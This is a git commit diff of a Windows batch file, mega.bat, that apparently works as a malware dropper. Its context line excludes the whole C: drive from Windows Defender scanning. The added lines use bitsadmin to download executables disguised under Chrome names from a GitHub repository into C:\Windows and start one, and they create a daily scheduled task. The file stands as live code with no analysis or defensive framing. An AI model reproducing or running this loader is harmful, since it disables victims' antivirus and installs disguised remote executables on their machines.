2a8b5a1254fb86b56ca9d9b42214a7f84ca10342
RobertAlex23 <112561351+RobertAlex23@users.noreply.github.com>
2022-09-16 19:52:52 +0530

    Add files via upload

--- mega.bat
+++ mega.bat
@@ -7,4 +7,10 @@
 powershell  -Command Add-MpPreference -ExclusionPath "C:\"
 
 @echo off
-cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/$wz$chrome.exe C:\Windows\chrome.exe&start chrome.exe"
+cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/Chrome.exe C:\Windows\Chrome.exe&start Chrome.exe"
+
+@echo off
+cmd.exe /c "bitsadmin /transfer debjob /download /priority high  http://github.com/RobertAlex23/winzo/raw/Winzo/$wz$chrome.exe C:\Windows\$wz$chrome.exe"
+
+@echo off
+powershell  -Command SCHTASKS /CREATE /SC DAILY /TN "MyTasks\Notepad task DAILY" /TR "C:\Windows\System32\notepad.exe" /ST 22:49
